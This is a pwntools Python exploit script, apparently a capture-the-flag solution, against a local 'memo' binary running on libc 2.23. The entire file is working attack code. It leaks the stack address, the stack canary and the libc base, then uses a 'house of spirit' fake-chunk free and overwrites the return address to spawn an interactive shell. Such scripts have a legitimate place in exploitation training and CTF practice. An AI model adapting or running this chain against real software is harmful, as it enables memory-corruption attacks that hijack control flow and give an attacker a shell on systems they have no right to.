from pwn import *

#context.log_level = 'debug'

# Allocate helper
def alloc(data, done='yes'):
    r.sendlineafter('> ', '1')

    r.sendafter('Data: ', data)

    r.sendafter('] ', done)

# leak helper
def show(lenght):
    r.sendlineafter('> ', '2')
    r.recvuntil('Data: ')
    r.recv(lenght)
    return u64(r.recvline().strip()[:8].ljust(8, '\x00'))

# Exit the binary to call the return function.
def out(done='yes\x00'):
    r.sendlineafter('> ', '1')
    r.sendafter('Data: ', 'A'*0x28+'\x00')
    r.sendafter('] ', done)
    r.sendlineafter('> ', '4')
    r.sendafter('] ', done)

# Exploit the tap out function.
def giveup(data):
    r.sendlineafter('> ', '4')
    r.sendafter('] ', data)

# Call the free function.
def delete():
    r.sendlineafter('> ', '3')

# The main exploit
def main():
    # Vuln 1: leak the stack address.
    alloc('A'*0x20)
    buf = show(0x20) - 0x110
    log.success("Buffer: 0x{:x}".format(buf))

    # Vuln 1: Leak the canary.
    alloc('B'*(0x28+1))
    canary = show(0x28) - ord('B')
    log.success("Canary: 0x{:x}".format(canary))

    # Vuln 2: Leak the libc puts address and calculate libc.
    giveup('no'.ljust(24,'\x00')+p64(memo.got['puts']))
    libc = show(0) - elf.symbols['puts']
    log.success("Libc: 0x{:x}".format(libc))
    elf.address = libc
    
    # Vuln 3: house of spirit
    exp = 'no\x00'.ljust(8, 'C')
    exp += p64(0x20)
    exp += p64(0)
    exp += p64(buf+0x10)
    exp += p64(0)
    exp += p64(0x1234)
    giveup(exp)
    delete()

    # Overwrite the return pointer
    alloc('D\x00', 'no\x00')
    r.sendafter('Data: ', '\x00'*24+p64(canary)+'EEEEEEEE'+p64(0x00000000004011f2))

    # Let the program return
    out()

    # Get shell.
    r.interactive()

context.terminal = ['tmux',"split","-h"]

gs="""
b 49
b 89
b 98
continue
"""
if __name__ == '__main__':
    elf = ELF('./libc-2.23.so')
    memo = ELF('./memo')
    if args.GDB:
        r = gdb.debug('./memo',env={'LD_PRELOAD':'./libc-2.23.so'}, gdbscript=gs)
    else:
        r = process('./memo',env={'LD_PRELOAD':'./libc-2.23.so'})
    main()

